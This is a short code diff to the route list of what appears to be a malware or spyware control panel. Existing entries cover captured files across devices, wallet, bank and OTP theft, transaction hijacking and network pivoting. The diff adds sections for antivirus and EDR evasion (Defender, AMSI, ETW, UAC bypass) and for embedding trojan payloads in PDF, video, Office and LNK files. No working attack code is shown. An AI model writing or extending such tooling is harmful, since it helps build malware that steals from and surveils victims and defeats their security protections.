@@ -27,6 +27,8 @@ const ROUTES: PaletteItem[] = [
   { id: "biometrics", label: "Biometrics",        sub: "Lock screen, passkeys, keystore",   href: "/biometrics",keys: "G B" },
   { id: "finance",    label: "Finance Intel",     sub: "Wallets, banks, OTP, TX hijack",   href: "/finance",   keys: "G W" },
   { id: "network",    label: "Network Ops",       sub: "LAN, WiFi, router hook, pivot",    href: "/network",   keys: "G N" },
+  { id: "evasion",    label: "AV/EDR Evasion",    sub: "Bypass Defender, AMSI, ETW, UAC",  href: "/evasion",   keys: "G E" },
+  { id: "embed",      label: "Payload Embedding",  sub: "PDF, video, Office, LNK trojan",   href: "/embed",     keys: "G D" },
   { id: "vault",      label: "File Vault",        sub: "All captured files across devices", href: "/vault",     keys: "G F" },
   { id: "workspaces", label: "Workspaces",        sub: "Create/switch/delete workspaces",  href: "/workspaces" },
   { id: "settings",   label: "Settings",          sub: "Config, PIN, connection, shortcuts", href: "/settings", keys: "G ," },
